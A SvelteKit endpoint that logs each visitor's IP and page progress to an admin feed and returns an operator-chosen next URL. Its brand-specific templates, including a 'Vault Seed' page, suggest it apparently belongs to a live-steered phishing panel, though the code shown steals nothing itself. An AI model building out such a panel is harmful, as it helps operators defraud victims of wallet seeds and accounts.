/**
 * Visitor page advance.
 *
 * Every interactive visitor template (Activity, Balance, External, Vault Seed, …)
 * POSTs here when the visitor presses its primary CTA. We log the action to the
 * admin activity feed and respond with the URL the visitor should move to next,
 * resolved through `getNextUrl` (admin override > default funnel mapping).
 *
 * Public endpoint — visitor pages must reach it without auth.
 */
import { json, type RequestHandler } from '@sveltejs/kit';
import { serverState } from '$lib/server/state';
import { broadcast } from '$lib/server/websocket';
import { getNextUrl } from '$lib/server/funnel';

export const POST: RequestHandler = async ({ request, getClientAddress }) => {
	let body: { brand?: string; page?: string; choice?: string; detail?: string } = {};
	try {
		body = await request.json();
	} catch {
		return json({ ok: false, error: 'invalid json' }, { status: 400 });
	}

	const brand = String(body.brand ?? '').trim();
	const page = String(body.page ?? '').trim();
	const choice = String(body.choice ?? '').trim().slice(0, 160);
	const detail = String(body.detail ?? '').trim().slice(0, 200);

	if (!brand || !page) {
		return json({ ok: false, error: 'brand and page required' }, { status: 400 });
	}

	const ip = getClientAddress() || '';
	const nextUrl = getNextUrl(brand, page);

	const parts = [`visitor ${ip} advanced from ${brand}/${page}`];
	if (choice) parts.push(`— ${choice}`);
	if (detail) parts.push(`(${detail})`);
	const message = parts.join(' ');

	const entry = serverState.addLogEntry(message, 'action');
	try {
		broadcast({ type: 'log:new', payload: entry });
	} catch {
		/* ws may not be ready in dev */
	}

	return json({ ok: true, nextUrl });
};
